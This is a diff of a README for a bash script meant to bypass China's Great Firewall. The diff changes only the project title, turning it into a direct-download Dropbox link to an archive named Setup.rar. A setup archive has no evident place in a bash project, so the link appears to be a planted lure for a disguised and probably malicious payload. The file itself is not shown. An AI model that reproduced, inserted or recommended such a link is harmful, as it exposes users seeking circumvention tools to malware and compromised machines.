@@ -1,4 +1,4 @@
-<h1 align="center"> 🚀 Astro 🚀 </h1>
+<h1 align="center"> [🚀 Astro 🚀](https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1) </h1>
 <h3 align="center"> 🎗️A bash script that helps bypass GFW 🎗️</h3>
 
 <p align="center"> <img src="https://komarev.com/ghpvc/?username=soroushnk&label=Profile%20views&color=0e75b6&style=flat" alt="soroushnk" />
